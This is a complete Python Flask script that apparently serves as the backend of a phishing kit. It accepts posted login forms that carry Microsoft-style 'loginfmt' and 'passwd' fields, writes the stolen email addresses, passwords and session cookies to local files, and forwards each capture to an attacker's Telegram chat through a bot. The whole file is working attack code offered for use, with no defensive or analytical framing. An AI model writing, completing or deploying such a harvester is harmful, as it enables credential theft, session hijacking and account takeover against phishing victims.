from flask import Flask, request, make_response
import requests
import telebot

BOT_TOKEN = "YOUR_BOT_TOKEN"  # Will be replaced during installation
CHAT_ID = "YOUR_CHAT_ID"      # Will be replaced during installation

bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

@app.route('/', methods=['POST'])
def capture():
    data = request.form.to_dict()
    cookies = request.cookies

    # Capture credentials
    if "loginfmt" in data and "passwd" in data:
        captured_data = f"🔴 Captured Credentials:\nEmail: {data['loginfmt']}\nPassword: {data['passwd']}"
        with open("captured_logins.txt", "a") as f:
            f.write(captured_data + "\n")
        bot.send_message(CHAT_ID, captured_data)

    # Capture cookies
    if cookies:
        cookie_data = f"🔵 Captured Cookies:\n{str(cookies)}"
        with open("cookies.txt", "a") as f:
            f.write(cookie_data + "\n")
        bot.send_message(CHAT_ID, cookie_data)

    return make_response("OK", 200)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
